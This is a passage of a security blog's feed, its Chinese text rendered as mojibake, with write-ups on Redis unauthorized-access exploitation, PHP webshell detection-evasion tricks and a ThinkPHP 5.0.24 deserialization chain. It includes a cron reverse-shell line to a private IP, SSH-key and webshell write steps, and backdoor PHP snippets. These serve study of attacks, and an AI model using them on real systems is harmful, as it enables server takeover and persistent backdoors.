2. redisæ‰§è¡Œå‘½ä»¤ï¼Œ`config set dir /root/.ssh/`å°†ç›®å½•åˆ‡æ¢åˆ°`/root/.ssh/`ï¼Œæ‰§è¡Œ`config set dbfilename authorized_keys`ï¼Œå†å°†public_keyå†™å…¥å˜é‡åæ‰§è¡Œsaveã€‚å¯¹äºå†™å…¥key:`(echo -e &quot;\n\n&quot;;cat id_rsa.pub; echo -e &quot;\n\n&quot;)&gt; 1.txt`ï¼Œç„¶åå†`cat 1.txt | redis-cli -h xx.xx.xx.xx -x set test`ï¼Œç„¶åè¿›å…¥æ‰§è¡Œ`save test`ï¼Œä¾¿å¯ä»¥è¿›è¡Œç™»å½•ã€‚
</code></pre>
<h4 id="2-å†™å®šæ—¶ä»»åŠ¡">2. å†™å®šæ—¶ä»»åŠ¡</h4>
<pre><code class="language-txt">æ¡ä»¶ï¼š
éœ€è¦è£…æœ‰å®šæ—¶ä»»åŠ¡(æœ‰ä¸€æ¬¡è¿›å…¥æœåŠ¡å™¨å†…æ²¡æœ‰å®šæ—¶ä»»åŠ¡)
æœ‰å†™çš„æƒé™

1. è®¾ç½®å˜é‡ `set x &quot;\n* * * * * bash -i &gt;&amp; /dev/tcp/192.168.63.128/7999 0&gt;&amp;1\n&quot;`
2. åˆ‡æ¢è·¯å¾„ `config set dir /var/spool/cron/`
3. è®¾ç½®æ–‡ä»¶å `config set dbfilename root`
4. ä¿å­˜è‡³æ–‡ä»¶ `save`
</code></pre>
<h4 id="3-å†™webshell">3. å†™webshell</h4>
<pre><code class="language-txt">æ¡ä»¶ï¼š
æœ‰å†™çš„æƒé™
çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„

1. è®¾ç½®è·¯å¾„ `config set dir /var/www/html/`
2. è®¾ç½®æ–‡ä»¶å `config set dbfilename shell.php`
3. è®¾ç½®å˜é‡ `set x &quot;&lt;?php phpinfo();?&gt;&quot;`
4. ä¿å­˜å˜é‡ `save`
</code></pre>
<h3 id="windowsä¸‹çš„åˆ©ç”¨">windowsä¸‹çš„åˆ©ç”¨</h3>
<h4 id="1-å†™webshellåŒä¸Š">1. å†™webshellï¼ˆåŒä¸Šï¼‰</h4>
<h4 id="2-å†™å¯åŠ¨é¡¹">2. å†™å¯åŠ¨é¡¹</h4>
<pre><code class="language-txt">C:/Users/Administrator/AppData/Roaming/Microsoft/Windows/Start Menu/Programs/startup/
</code></pre>
<h3 id="å‘ç‚¹">å‘ç‚¹</h3>
<p>å†™<code>crontab</code>çš„æ—¶å€™ï¼Œä¸€å®šè¦æ³¨æ„ï¼Œä¸ä¸€å®šæ‰€æœ‰ç³»ç»Ÿéƒ½åŒ…å«crontabæœåŠ¡</p>
<h2 id="æ”»å‡»å¸¦æœ‰å¯†ç çš„redis">æ”»å‡»å¸¦æœ‰å¯†ç çš„redis</h2>
<blockquote>
<p>è¿‘æœŸåœ¨çœ‹redisæœªæˆæƒï¼Œå¤§éƒ¨åˆ†æåˆ°çš„éƒ½æ˜¯ssrf + æˆæƒçš„redisï¼Œ å³ç”¨<code>gopher://</code>åè®®è¿›è¡Œæ”»å‡»ã€‚é‚£ä¹ˆå¦‚æœå†…ç½‘rediså¸¦æœ‰å¯†ç æˆ–è€…åˆ«çš„è®¤è¯çš„æƒ…å†µä¸‹å‘¢ï¼Ÿæ‰¾åˆ°äº†ç›¸å…³æ–‡ç« å­¦ä¹ äº†ä¸€ä¸‹</p>
</blockquote>
<p>è¿™ç¯‡<a href="https://zhuanlan.zhihu.com/p/74324307">æ–‡ç« </a>æåŠåˆ°äº†å¦‚ä½•æ”»å‡»å¸¦æœ‰å¯†ç çš„redis</p>
<h3 id="å‰æçŸ¥è¯†">å‰æçŸ¥è¯†</h3>
<p>RedisæœåŠ¡å™¨ä¸å®¢æˆ·ç«¯é€šè¿‡RESPï¼ˆREdis Serialization Protocolï¼‰åè®®é€šä¿¡ã€‚RESPåè®®-ç®€ä¹¦è¿™è¾¹æ–‡ç« ç®€å•åœ°æè¿°äº†è¯¥åè®®çš„æ ¼å¼ï¼Œåœ¨ssrfçš„æ—¶å€™æˆ‘ä»¬è¦å°†payloadè½¬åŒ–ä¸ºè¿™ä¸€ç§ç±»å‹æ ¼å¼</p>
<h3 id="å…·ä½“ç»†èŠ‚">å…·ä½“ç»†èŠ‚</h3>
<p>å…¶å®è¯»å®Œä¸Šè¿°æ–‡ç« åäº†è§£åˆ°åç»­å†™shellçš„åœ°æ–¹éƒ½æ˜¯å·®ä¸å¤šçš„ï¼Œåªæ˜¯å‰é¢çš„å†…å®¹æœ‰æ‰€ä¸åŒã€‚ä¹‹å‰å¤ä¹ gopherå†™shellçš„æ—¶å€™å…¶å®å·²ç»äº†è§£åˆ°ï¼Œrediså¯ä»¥ä¸€æ¬¡æ€§å†™å…¥å¤šæ¡è¯­å¥æ‰§è¡Œï¼Œæœ€åè¯»å–æ‰§è¡Œç»“æœã€‚</p>
<p>é‚£ä¹ˆè®¤è¯çš„redisæœ¬è´¨ä¸Šåªæ˜¯å¤šäº†å‰é¢åˆ¤æ–­è®¤è¯çš„è¿‡ç¨‹ï¼Œå…·ä½“ä¸º<code>%2A2%0d%0a%244%0d%0aAUTH%0d%0a%246%0d%0a123123%0D%0A</code></p>
<h3 id="è®¤ä¸ºä¸å¯¹çš„åœ°æ–¹">è®¤ä¸ºä¸å¯¹çš„åœ°æ–¹</h3>
<p>åœ¨è§‚å¯Ÿè¿™äº›<code>payload</code>çš„æ—¶å€™ï¼Œéƒ½ä¼šå‘ç°ä¸€ä¸ªé—®é¢˜ï¼Œå°±æ˜¯ä»–ä»¬éƒ½åŒ…å«äº†<code>flushall</code>è¿™ä¸ªæ“ä½œã€‚å¦‚æœæ˜¯åœ¨å®é™…ç¯å¢ƒè¿›è¡Œæµ‹è¯•ï¼Œæˆ‘è®¤ä¸º<code>flushall</code>åº”è¯¥ä¸å¦¥å§...</p>
<h2 id="çŸ¥è¯†æ‰©å±•">çŸ¥è¯†æ‰©å±•</h2>
<p>å¯¹äºå†™redis shellï¼Œçœ‹æ–‡ç« æœ€å¸¸è§çš„å°±æ˜¯gopheråè®®ï¼Œé‚£ä¹ˆå¦‚æœgopheråè®®è¢«ç¦ç”¨å‘¢</p>
<p>æ‰¾åˆ°<a href="https://www.cnblogs.com/-chenxs/p/11749367.html">å‚è€ƒæ–‡ç« </a>ï¼Œç»§ç»­æ¢ç´¢</p>
<h3 id="å…¶ä»–æ–¹æ³•">å…¶ä»–æ–¹æ³•</h3>
<h4 id="header-crlfæ³¨å…¥">header CRLFæ³¨å…¥</h4>
<p>è¿™ä¸ªæ”»å‡»æ–¹å¼è¾ƒä¸ºå°‘è§ï¼Œæ¯”è¾ƒé€‚ç”¨äºweblogicçš„SSRFæ”»å‡»</p>
<h4 id="dictåè®®">dictåè®®</h4>
<h2 id="ä¸»ä»å¤åˆ¶">ä¸»ä»å¤åˆ¶</h2>
<h3 id="å‰ç½®çŸ¥è¯†">å‰ç½®çŸ¥è¯†</h3>
<h4 id="ä»€ä¹ˆæ˜¯ä¸»ä»å¤åˆ¶">ä»€ä¹ˆæ˜¯ä¸»ä»å¤åˆ¶</h4>
<p>å½“Redisæ˜¯å•ä¸ªå®ä¾‹çš„æ—¶å€™ï¼Œå½“è¯»å†™é‡è¾ƒå¤§æ—¶æœåŠ¡å™¨éš¾ä»¥æ‰¿å—ã€‚ä¸»ä»æ¨¡å¼å³æŒ‡å®šä¸€ä¸ªrediså®ä¾‹ä½œä¸ºä¸»æœºï¼Œå…¶ä»–éƒ½æ˜¯å¤‡ä»½æœºï¼Œä»æœºåªè´Ÿè´£è¯»ï¼Œä¸»æœºåªè´Ÿè´£å†™æ¥åˆ†æ‹…å‹åŠ›</p>
<h4 id="ä¸»ä»å¤åˆ¶getshellä¼˜ç‚¹">ä¸»ä»å¤åˆ¶getshellä¼˜ç‚¹</h4>
<p>ä¸»ä»å¤åˆ¶Getshellæœ‰ä»€ä¹ˆä¼˜ç‚¹ï¼šç°åœ¨å®¹å™¨åŒ–ã€ç»„ä»¶åŒ–ä¸æ–­å‘å±•ï¼Œå¯¼è‡´åœ¨å®¹å™¨å†…å¾€å¾€åªæœ‰ä¸€ä¸ªæœåŠ¡ï¼Œé‚£ä¹ˆé€šè¿‡å†™webshellï¼Œcrontabï¼Œsshç­‰getshellçš„æ“ä½œä¼šè¶Šæ¥è¶Šéš¾ï¼Œè€Œä¸»ä»å¤åˆ¶æ¼æ´ä¸ä¾èµ–å…¶ä»–æœåŠ¡ï¼Œç›´æ¥getshell</p>
<h4 id="redisæ¨¡å—">redisæ¨¡å—</h4>
<p>redis4.xä¹‹åï¼Œæ–°å¢äº†æ¨¡å—åŠŸèƒ½ï¼Œé€šè¿‡å¤–éƒ¨æ‰©å±•ï¼Œå¯ä»¥åœ¨redisä¸­å®ç°ä¸€ä¸ªæ–°çš„rediså‘½ä»¤ã€‚redisæ¨¡å—å®é™…æ˜¯ä¸€ä¸ªåŠ¨æ€åº“ï¼Œä»–èƒ½å¤Ÿè®©redis-cliä½¿ç”¨module loadæŠŠä»–åŠ è½½åˆ°rediså†…æ ¸</p>
<h4 id="payload">payload</h4>
<p>https://github.com/LoRexxar/redis-rogue-server</p>
<p>å¦ä¸€<a href="https://www.t00ls.net/articles-56339.html">å¥½æ–‡</a></p>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[PHPåé—¨&ç‰¹æ€§è®°å½•]]></title>
        <id>https://chriskalix.github.io/post/php-hou-men-andte-xing-ji-lu/</id>
        <link href="https://chriskalix.github.io/post/php-hou-men-andte-xing-ji-lu/">
        </link>
        <updated>2020-06-14T04:24:32.000Z</updated>
        <content type="html"><![CDATA[<blockquote>
<p>è¿™ä¸¤å¤©è¯»äº†Pç‰›çš„æ–‡ç« ï¼Œæ­£å¥½ç¾¤é‡Œçš„å¤§ä½¬å‘å‡ºäº†æ–‡ç« ç”¨åˆ°äº†Tricksã€‚ç”±äºphpå®¡è®¡è¿˜å¤„äºä¸æˆç†Ÿé˜¶æ®µï¼Œè®°å½•ä¸€ä¸‹è¯»åæ„Ÿå—</p>
</blockquote>
<h2 id="phpçš„ç‰¹æ€§æ£€æµ‹">PHPçš„ç‰¹æ€§&amp;æ£€æµ‹</h2>
<p>é€šå¸¸çš„ï¼Œå¸¸è§çš„php webshellå¾ˆå®¹æ˜“è¢«åƒã€‚å‰æ®µæ—¶é—´å¤„ç†ç½‘ç«™è¢«æŒ‚é©¬ï¼Œé©¬éƒ½æ¯”è¾ƒæ˜æ˜¾ï¼Œè¦ä¹ˆæ˜¯æ··æ·†è¦ä¹ˆæ˜¯å›è°ƒï¼Œè¿™ç§å¾€å¾€æ˜¯å› ä¸ºæ²¡æœ‰å‰ç½®ä¸€ä¸ªè¾ƒå¥½çš„webshellæ£€æµ‹ï¼Œæœ‰çš„è¯è¿™ä¹ˆç®€å•çš„é©¬åº”è¯¥æ˜¯ä¼ ä¸ä¸Šæ¥çš„ã€‚<br>
è¿™æ—¶æˆ‘é—®æˆ‘è‡ªå·±ï¼Œå¦‚æœæ˜¯æˆ‘æ¥ä¸Šä¼ é©¬ï¼Œæˆ‘ä¼šæ€ä¹ˆåšï¼Ÿæˆ‘å‘ç°æˆ‘çš„æƒ³æ³•ä¹Ÿæ¯”è¾ƒå±€é™ï¼Œæ— éå°±æ˜¯æ­£åˆ™æ‰§è¡Œï¼Œå›è°ƒï¼ŒåŠ å¯†æ··æ·†ç­‰ç­‰ğŸ˜…ã€‚æ­¤æ—¶çœ‹åˆ°Pç‰›çš„æ–‡ç« ï¼Œæ„Ÿè§‰ååˆ†ç¥å¥‡ï¼Œè®°å½•ä¸€ä¸‹</p>
<h2 id="å‰ç½®çŸ¥è¯†">å‰ç½®çŸ¥è¯†</h2>
<p>æ–‡ç« ä¸­æåˆ°äº†é’ˆå¯¹ä¸€ä¸ªå›è°ƒå‹åé—¨ï¼Œæ£€æµ‹å¼•æ“ä¼šå¦‚ä½•æ£€æµ‹ï¼š</p>
<ol>
<li>éå†ASTæ ‘</li>
<li>åˆ†æ<code>FuncCall Node</code>åˆ¤æ–­æ˜¯å¦æœ‰å›è°ƒ</li>
<li>å›è°ƒæ˜¯å¦æ˜¯ä¸€ä¸ªå˜é‡</li>
</ol>
<h2 id="å‡½æ•°åˆ«å">å‡½æ•°åˆ«å</h2>
<p>æˆ‘èƒ½æƒ³åˆ°çš„æ­£åˆ™æ‰§è¡Œï¼Œåœ¨PHP7åå·²ç»è¢«åˆ é™¤äº†ã€‚mb_ereg_replaceå’Œmb_eregi_replaceè¿™ä¸¤ä¸ªå‡½æ•°ä¾ç„¶å¯ä»¥ï¼Œä»–ä»¬çš„åˆ«åmbereg_replaceå’Œmbereg_ireplaceä¹Ÿèƒ½æ‰§è¡Œä»»æ„ä»£ç ã€‚Pç‰›æ¼”ç¤ºçš„ä»£ç æ®µä¸º</p>
<pre><code class="language-php">&lt;?php
mbereg_replace('.*', '\0', $_REQUEST[2333], 'mer');
</code></pre>
<p>åœ¨PHP7.2.9çš„ç¯å¢ƒä¸­æŠ¥é”™ï¼Œåˆ‡æ¢åˆ°ä½ç‰ˆæœ¬åæ²¡æœ‰é—®é¢˜äº†<br>
ä¸Šè¿°çš„æ˜¯ä¸€ä¸ªå¼•å­ï¼Œé€šç”¨çš„æ–¹æ³•æ˜¯è‡ªå·±æ¥ç”³æ˜å‡½æ•°çš„åˆ«åï¼Œä¾‹å¦‚</p>
<pre><code class="language-php">&lt;?php
use function \assert as test;
test($_POST[2333]);
</code></pre>
<p>ä»¥åŠPHP7çš„</p>
<pre><code class="language-php">&lt;?php
$f = new class($_POST['name']) extends ReflectionFunction {};
$f-&gt;invoke($_POST[2333]);
</code></pre>
<p><strong>ç¥å¥‡çš„trick</strong></p>
<pre><code class="language-php">printf&lt;char&gt;('hello world')
</code></pre>
<p>å…¶ä¸­<char>çš„èŒƒå›´æ˜¯[\x00-\x20],PHPä¼šå¿½ç•¥è¿™ä¸ªæ§åˆ¶å­—ç¬¦ï¼Œä¹Ÿæ˜¯ä¸€ä¸ªç»•è¿‡çš„tricksï¼ˆPHP-Parseræ˜¯æ— æ³•æ­£ç¡®è§£æçš„ï¼‰</p>
<h2 id="æ–‡ç« æ€»ç»“">æ–‡ç« æ€»ç»“</h2>
<ol>
<li>åˆ«å</li>
<li>é‡å‘½å</li>
<li>å‚æ•°åä½ç½®(å˜é•¿å‚æ•°)</li>
<li>æ§åˆ¶å­—ç¬¦(é‡ç‚¹)</li>
<li>PHPæ ‡ç­¾</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Thinkphp 5.0.24 ååºåˆ—åŒ–é“¾åˆ†æ]]></title>
        <id>https://chriskalix.github.io/post/thinkphp-5024-fan-xu-lie-hua-lian-fen-xi/</id>
        <link href="https://chriskalix.github.io/post/thinkphp-5024-fan-xu-lie-hua-lian-fen-xi/">
        </link>
        <updated>2020-06-14T04:13:42.000Z</updated>
        <content type="html"><![CDATA[<h2 id="å…·ä½“åˆ†æ">å…·ä½“åˆ†æ</h2>
<blockquote>
<p>è¿™é‡Œéå¸¸çš„é•¿ï¼Œæ¯”è¾ƒå¤æ‚ï¼Œæ¨èä¸¤ä¸ªæ–‡ç« <br>
https://www.anquanke.com/post/id/196364#h2-5<br>
http://althims.com/2020/02/07/thinkphp-5-0-24-unserialize/<br>
è¿™é‡Œä¸»è¦æ˜¯è®°å½•ä¸€ä¸‹æˆ‘è·Ÿç€å…¶ä»–ä½œè€…çš„æ–‡ç« åˆ†æçš„æµç¨‹</p>
</blockquote>
<h3 id="å…¥å£ç‚¹">å…¥å£ç‚¹</h3>
<p>é¦–å…ˆæ‰¾åˆ° <code>__destruct</code> é€‰æ‹©<code>/thinkphp/library/think/process/pipes/Windows.php</code>ä¸‹çš„ï¼Œä»£ç å¦‚ä¸‹</p>
<pre><code class="language-php">public function __destruct()
{
    $this-&gt;close();
    $this-&gt;removeFiles();
}
</code></pre>
<p>è·Ÿè¿›<code>removeFiles()</code></p>
<pre><code class="language-php">private function removeFiles()
{
    foreach ($this-&gt;files as $filename) {
        if (file_exists($filename)) {
            @unlink($filename);
        }
    }
    $this-&gt;files = [];
}
</code></pre>
<p>è¿™è¾¹çš„<code>$files</code>å¯æ§ï¼Œé€šè¿‡å‘<code>file_exists</code>ä»»æ„ç±»æ¥è§¦å‘<code>__toString()</code>ï¼Œé‚£ä¹ˆç»§ç»­è·Ÿè¿›å¯»æ‰¾ï¼Œåœ¨<code>/thinkphp/library/think/Model.php</code>ä¸­æ‰¾åˆ°</p>
<pre><code class="language-php">public function __toString() // å…¨å±€æœç´¢__toStringï¼Œæ‰¾åˆ°è¿™é‡Œï¼Œç»§ç»­è·Ÿè¿›
{
    return $this-&gt;toJson();
}
</code></pre>
<pre><code class="language-php">public function toJson($options = JSON_UNESCAPED_UNICODE) // è°ƒç”¨toArrayï¼Œç»§ç»­è·Ÿè¿›
{
    return json_encode($this-&gt;toArray(), $options);
}
</code></pre>
<p>è°ƒç”¨äº†<code>toArray()</code>ï¼Œç»§ç»­è·Ÿè¿›ï¼Œè¿™è¾¹å‡½æ•°å¤ªé•¿ï¼Œæå–å‡ºå…³é”®å­—æ®µ</p>
<h3 id="åˆ†æéš¾ç‚¹">åˆ†æéš¾ç‚¹</h3>
<p>è¿™è¾¹åˆ†ææ˜¯ä¸€ä¸ªè½¬æŠ˜ç‚¹ï¼Œæœ‰å‡ æ¬¡èµ‹å€¼å’Œæ–¹æ³•ï¼Œè·Ÿç€åˆ«çš„ä½œè€…æ–‡ç« çœ‹çš„æ—¶å€™è§‰å¾—è¿™é‡Œæ¯”è¾ƒå¤æ‚</p>
<pre><code class="language-php">public function toArray() // toArrayè¿™é‡Œæ˜¯éš¾ç‚¹ï¼Œä»”ç»†åˆ†æï¼Œå› ä¸ºæˆ‘ä»¬çš„æœ€ç»ˆç›®çš„æ˜¯æ‰§è¡Œ__callï¼Œæ‰€ä»¥æ‰¾åˆ°ä¸‰å¤„ç–‘ä¼¼åˆ©ç”¨ç‚¹
{
    $item    = [];
    $visible = [];
    $hidden  = [];
    ...
    if (!empty($this-&gt;append)) {    // [*] ä¸€: appendä¸èƒ½ä¸ºç©º (è¿™é‡Œappendæ˜¯å¯æ§çš„)
        foreach ($this-&gt;append as $key =&gt; $name) {
            if (is_array($name)) {  // [*] äºŒ: $nameæ˜¯å¦æ˜¯array (æ˜¾ç„¶ä¹Ÿæ˜¯å¯æ§)
                $relation   = $this-&gt;getAttr($key);
                $item[$key] = $relation-&gt;append($name)-&gt;toArray();
            } elseif (strpos($name, '.')) { // [*] ä¸‰: $nameä¸­æ˜¯å¦åŒ…å« . ï¼ŒåŒ…å«çš„è¯è¿›åˆ°è¿™ä¸ªå¾ªç¯
                list($key, $attr) = explode('.', $name);
                $relation   = $this-&gt;getAttr($key);
                /** ç¬¬ä¸€å¤„ **/
                $item[$key] = $relation-&gt;append([$attr])-&gt;toArray();
            } else {
                $relation = Loader::parseName($name, 1, false); // $nameå¯æ§ï¼Œè·Ÿè¿›å‡½æ•°(åªæ˜¯ä¿®æ”¹å‡½æ•°å‘½å)
                if (method_exists($this, $relation)) {          // [*] å››: åˆ¤æ–­è¯¥æ–¹æ³•æ˜¯å¦å­˜åœ¨äºç±»ä¸­
                    $modelRelation = $this-&gt;$relation(); // è°ƒç”¨è¯¥æ–¹æ³•å¹¶èµ‹å€¼$modelRelation (è¿™è¾¹æ‰¾åˆ°çš„æ˜¯getErrorå‡½æ•°)
                    $value         = $this-&gt;getRelationData($modelRelation); //è·Ÿè¿›getRelationData -&gt; 639è¡Œ

                    if (method_exists($modelRelation, 'getBindAttr')) { // [*] äº”: æ»¡è¶³è¿”å›çš„å‡½æ•°å­˜åœ¨getBindAttr
                        /** ç¬¬äºŒå¤„ **/
                        $bindAttr = $modelRelation-&gt;getBindAttr();
                        if ($bindAttr) {                           // [*] å…­: å€¼å­˜åœ¨åˆ™ç»§ç»­
                            foreach ($bindAttr as $key =&gt; $attr) {
                                $key = is_numeric($key) ? $attr : $key;
                                if (isset($this-&gt;data[$key])) {
                                    throw new Exception('bind attr has exists:' . $key);
                                } else {    // [*] ä¸ƒ: this-&gt;data[$key]æ²¡æœ‰èµ‹å€¼
                                    /** ç¬¬ä¸‰å¤„ **/
                                    $item[$key] = $value ? $value-&gt;getAttr($attr) : null;
                                }
                            }
                            continue;
                        }
                    }
                    $item[$name] = $value;
                } else {
                    $item[$name] = $this-&gt;getAttr($name);
                }
            }
        }
    }
    return !empty($item) ? $item : [];
}
</code></pre>
<p>è¿™é‡Œé€‰ç”¨ç¬¬ä¸‰å¤„ä½œä¸ºè·³è½¬ç‚¹ï¼Œçœ‹åˆ°åˆ¤æ–­ç‚¹å››ä¸‹æœ‰ä¸¤ä¸ªèµ‹å€¼æ“ä½œ</p>
<pre><code class="language-php">$modelRelation = $this-&gt;$relation(); // è°ƒç”¨è¯¥æ–¹æ³•å¹¶èµ‹å€¼$modelRelation (è¿™è¾¹æ‰¾åˆ°çš„æ˜¯getErrorå‡½æ•°)
$value         = $this-&gt;getRelationData($modelRelation); // è·Ÿè¿›getRelationData -&gt; 639è¡Œ
</code></pre>
<p>è¿™é‡Œçš„<code>$relation</code>æ˜¯å¯æ§çš„ï¼Œåœ¨<code>Model.php</code>ä¸‹å¯æ§çš„å‡½æ•°é€‰æ‹© <code>getError</code></p>
<pre><code class="language-php">public function getError()
{
    return $this-&gt;error; // è¿™é‡Œçš„erroræ˜¯å¯ä»¥æ§åˆ¶çš„ï¼Œæ‰€ä»¥é€‰æ‹©è¿™é‡Œ
}
</code></pre>
<p>ç„¶åè·Ÿè¿›<code>$value=$this-&gt;getRelationData($modelRelation);</code></p>
<pre><code class="language-php">protected function getRelationData(Relation $modelRelation)
{
    if ($this-&gt;parent &amp;&amp; !$modelRelation-&gt;isSelfRelation() &amp;&amp; get_class($modelRelation-&gt;getModel()) == get_class($this-&gt;parent)) {
        $value = $this-&gt;parent;
    } else {
        // é¦–å…ˆè·å–å…³è”æ•°æ®
        if (method_exists($modelRelation, 'getRelation')) {
            $value = $modelRelation-&gt;getRelation();
        } else {
            throw new BadMethodCallException('method not exists:' . get_class($modelRelation) . '-&gt; getRelation');
        }
    }
    return $value;
}
</code></pre>
<p>é¦–å…ˆè¦æ»¡è¶³ç©¿æ¥çš„<code>$modelRelation</code>æ˜¯Relationç±»ï¼Œå…¨å±€æŸ¥æ‰¾getRelationæ–¹æ³•ä¸”ä¸ºRelationç±»çš„ç±»ï¼Œæ‰¾åˆ° <code>HasOne``(/thinkphp/library/think/model/relation/HasOne.php)</code></p>
<pre><code class="language-php">public function getRelation($subRelation = '', $closure = null)
{
    // æ‰§è¡Œå…³è”å®šä¹‰æ–¹æ³•
    $localKey = $this-&gt;localKey;
    if ($closure) {
        call_user_func_array($closure, [ &amp; $this-&gt;query]);
    }
    // åˆ¤æ–­å…³è”ç±»å‹æ‰§è¡ŒæŸ¥è¯¢
    $relationModel = $this-&gt;query
        -&gt;removeWhereField($this-&gt;foreignKey)
        -&gt;where($this-&gt;foreignKey, $this-&gt;parent-&gt;$localKey)
        -&gt;relation($subRelation)
        -&gt;find();

    if ($relationModel) {
        $relationModel-&gt;setParent(clone $this-&gt;parent);
    }

    return $relationModel;
}
</code></pre>
<p>å¯ä»¥çœ‹åˆ°æ»¡è¶³æ¡ä»¶ï¼Œé‚£ä¹ˆå›åˆ°<code>Model.php</code>ä¸­ç»§ç»­è·Ÿè¿›åˆ°ç¬¬ä¸‰å¤„ï¼Œæ‰§è¡Œåˆ°<code>Output.php</code>çš„__callå‡½æ•°ï¼Œè°ƒç”¨äº†blockï¼Œè·Ÿè¿›block</p>
<pre><code class="language-php">protected function block($style, $message)
{
    $this-&gt;writeln(&quot;&lt;{$style}&gt;{$message}&lt;/$style&gt;&quot;);
}
</code></pre>
<pre><code class="language-php">public function writeln($messages, $type = self::OUTPUT_NORMAL)
{
    $this-&gt;write($messages, true, $type);
}
</code></pre>
<pre><code class="language-php">public function write($messages, $newline = false, $type = self::OUTPUT_NORMAL)
{
    $this-&gt;handle-&gt;write($messages, $newline, $type);
}
</code></pre>
<p>handleå¯æ§ï¼Œçœ‹çœ‹æœ‰æ²¡æœ‰åˆ«çš„writeï¼Œ<code>/thinkphp/library/think/session/driver/Memcached.php</code>ä¸­æœ‰</p>
<pre><code class="language-php">public function write($sessID, $sessData)
{
    return $this-&gt;handler-&gt;set($this-&gt;config['session_name'] . $sessID, $sessData, $this-&gt;config['expire']);
}
</code></pre>
<p>è·Ÿåˆ°äº†setè·³æ¿ï¼Œå…¨å±€æ‰¾åˆ°<code>/thinkphp/library/think/cache/driver/File.php</code>ä¸‹çš„set</p>
<pre><code class="language-php">public function set($name, $value, $expire = null) // è·Ÿåˆ°set
{
    if (is_null($expire)) {
        $expire = $this-&gt;options['expire'];
    }
    if ($expire instanceof \DateTime) {
        $expire = $expire-&gt;getTimestamp() - time();
    }
    $filename = $this-&gt;getCacheKey($name, true); // nameå¯æ§ï¼Œç»§ç»­è·Ÿè¿›
    if ($this-&gt;tag &amp;&amp; !is_file($filename)) {
        $first = true;
    }
    $data = serialize($value);
    if ($this-&gt;options['data_compress'] &amp;&amp; function_exists('gzcompress')) {
        //æ•°æ®å‹ç¼©
        $data = gzcompress($data, 3);
    }
    $data   = &quot;&lt; ?php\n//&quot; . sprintf('%012d', $expire) . &quot;\n exit();?&gt;\n&quot; . $data;
    $result = file_put_contents($filename, $data);
    if ($result) {
        isset($first) &amp;&amp; $this-&gt;setTagItem($filename);
        clearstatcache();
        return true;
    } else {
        return false;
    }
}
</code></pre>
<p>è¿™é‡Œå†™å…¥å‡½æ•°file_put_contentsçš„$filenameç”±getCacheKeyæ¥ï¼Œè·Ÿè¿›çœ‹</p>
<pre><code class="language-php">protected function getCacheKey($name, $auto = false)
{
    $name = md5($name);
    if ($this-&gt;options['cache_subdir']) {
        // ä½¿ç”¨å­ç›®å½•
        $name = substr($name, 0, 2) . DS . substr($name, 2);
    }
    if ($this-&gt;options['prefix']) {
        $name = $this-&gt;options['prefix'] . DS . $name;
    }
    $filename = $this-&gt;options['path'] . $name . '.php';//ç”¨åè®®
    $dir      = dirname($filename);

    if ($auto &amp;&amp; !is_dir($dir)) {
        mkdir($dir, 0755, true);
    }
    return $filename;
}
</code></pre>
<p>optionsæ˜¯å¯æ§çš„ï¼Œç»§ç»­å›å»çœ‹<span class="katex"><span class="katex-mathml"><math><semantics><mrow><mi>d</mi><mi>a</mi><mi>t</mi><mi>a</mi><mi mathvariant="normal">ä¸</mi></mrow><annotation encoding="application/x-tex">dataä¸</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord mathdefault">d</span><span class="mord mathdefault">a</span><span class="mord mathdefault">t</span><span class="mord mathdefault">a</span><span class="mord cjk_fallback">ä¸</span></span></span></span>valueæœ‰å…³</p>
<pre><code class="language-php">$data = serialize($value);
...
$data   = &quot;&lt;?php\n//&quot; . sprintf('%012d', $expire) . &quot;\n exit();?&gt;\n&quot; . $data;
</code></pre>
<p>è¿™é‡Œçš„$valueè¿›æ¥æ˜¯trueï¼Œæ‰€ä»¥è¿™é‡Œä¸å¯æ§ï¼Œä½†æ˜¯å†™å®Œåä¼šè°ƒç”¨setTagItemï¼Œè¿™é‡Œåœ¨<code>Driver.php</code>é‡Œ</p>
<pre><code class="language-php">protected function setTagItem($name)
{
    if ($this-&gt;tag) {
        $key       = 'tag_' . md5($this-&gt;tag);
        $this-&gt;tag = null;
        if ($this-&gt;has($key)) {
            $value   = explode(',', $this-&gt;get($key));
            $value[] = $name;
            $value   = implode(',', array_unique($value));
        } else {
            $value = $name;
        }
        $this-&gt;set($key, $value, 0); //å†æ¬¡è°ƒç”¨set
    }
}
</code></pre>
<p>å¯ä»¥çœ‹åˆ°è¿™é‡Œçš„å€¼éƒ½æ˜¯å¯æ§çš„ï¼Œå†è°ƒç”¨äº†setï¼Œæ‰€ä»¥å¯ä»¥æˆåŠŸçš„å†™å…¥æ–‡ä»¶</p>
<h2 id="æ€»ç»“">æ€»ç»“</h2>
<ol>
<li>windowsä¸‹å†™pocçš„tips1ï¼Œï¼ˆæ„Ÿè°¢oswordå°åˆ€å¸ˆå‚…ï¼‰ï¼Œå†™å…¥&lt;?exp.phpï¼Œç›¸å½“äºexp.phpï¼Œå¦å¤–ä¸€ä¸ªhttps://xz.aliyun.com/t/7310ã€‚è‡ªè¡Œæ›´æ”¹åå³å¯~</li>
<li>è¦æ‰¾ä¸€ä¸ªæœ‰å†™å…¥æƒé™çš„ç›®å½•</li>
</ol>
]]></content>
    </entry>
    <entry>
        <title type="html"><![CDATA[Thinkphp 6.x(å°äº6.0.2)ä¸å®‰å…¨çš„sessionidåˆ†æ]]></title>
        <id>https://chriskalix.github.io/post/thinkphp-6xxiao-yu-602bu-an-quan-de-sessionid-fen-xi/</id>
        <link href="https://chriskalix.github.io/post/thinkphp-6xxiao-yu-602bu-an-quan-de-sessionid-fen-xi/">
        </link>
        <updated>2020-06-14T04:05:26.000Z</updated>
        <content type="html"><![CDATA[<h2 id="å‰è¨€">å‰è¨€</h2>
<p>2020-01-10ï¼Œthinkphpçš„githubä¸Šæ›´æ–°äº†ä¸€å¤„å¯¹sessionidæ£€æŸ¥çš„ä¸€å¤„éšæ‚£<br>
<img src="https://chriskalix.github.io/post-images/1592107642955.png" alt="" loading="lazy"><br>
æ›´æ–°ä»£ç æ®µå¦‚ä¸‹<br>
<img src="https://chriskalix.github.io/post-images/1592107658091.png" alt="" loading="lazy"><br>
